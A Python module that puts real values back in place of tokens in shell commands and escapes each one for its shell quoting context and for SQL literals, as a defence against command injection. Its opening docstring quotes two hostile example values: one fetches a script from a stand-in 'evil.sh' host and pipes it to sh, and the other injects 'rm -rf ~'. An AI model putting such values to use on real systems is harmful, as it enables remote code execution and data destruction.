"""Context-aware rehydration for shell commands.

Rehydrating a token into a Bash command turns *data* into *code*: a customer
whose display name is `$(curl evil.sh|sh)` or `x"; rm -rf ~; "` would be
executed, and even `O'Brien` breaks an SQL literal. So each token is replaced
with its real value escaped for the exact place it sits in the command:

  unquoted         -> shlex.quote(value)
  '...'            -> ' becomes '\\''
  "..."            -> \\ " $ ` are backslash-escaped
  "... '...' ..."  -> SQL literal inside a double-quoted shell string
                      (sqlite3/psql -c "... where email = 'TOKEN'"):
                      ' doubled for SQL, then escaped for the shell
"""

from __future__ import annotations

import shlex

NONE, SQ, DQ = "none", "single", "double"


def quote_states(command: str) -> list[tuple[str, bool]]:
    """Per character: (shell quote state, inside an SQL '...' literal within "...")."""
    states: list[tuple[str, bool]] = []
    state, sql, i = NONE, False, 0
    while i < len(command):
        c = command[i]
        if state == NONE:
            if c == "\\" and i + 1 < len(command):
                states += [(NONE, False)] * 2
                i += 2
                continue
            states.append((NONE, False))
            if c == "'":
                state = SQ
            elif c == '"':
                state, sql = DQ, False
        elif state == SQ:
            if c == "'":
                state = NONE
                states.append((NONE, False))
            else:
                states.append((SQ, False))
        else:  # DQ
            if c == "\\" and i + 1 < len(command):
                states += [(DQ, sql)] * 2
                i += 2
                continue
            if c == '"':
                state = NONE
                states.append((NONE, False))
            else:
                if c == "'":
                    sql = not sql
                    states.append((DQ, False))  # the quote itself
                else:
                    states.append((DQ, sql))
        i += 1
    return states


def escape(value: str, state: str, sql: bool) -> str:
    if sql:
        value = value.replace("'", "''")
    if state == NONE:
        return shlex.quote(value) if value and any(not (c.isalnum() or c in "@%+=:,./-_") for c in value) \
            else value
    if state == SQ:
        return value.replace("'", "'\\''")
    return "".join("\\" + c if c in '\\"$`' else c for c in value)


def rehydrate_command(veil, command: str, only=None) -> str:
    """Replace tokens in a shell command with shell- (and SQL-literal-) safe real values."""
    pattern = veil.token_pattern()
    if pattern is None:
        return command
    allowed = set(only) if only is not None else None
    states = quote_states(command)
    out, pos = [], 0
    for m in pattern.finditer(command):
        tok = m.group()
        value = veil.vault.value_for(tok)
        if value is None or (allowed is not None and tok not in allowed):
            continue
        state, sql = states[m.start()] if m.start() < len(states) else (NONE, False)
        out += [command[pos:m.start()], escape(value, state, sql)]
        pos = m.end()
    out.append(command[pos:])
    return "".join(out)
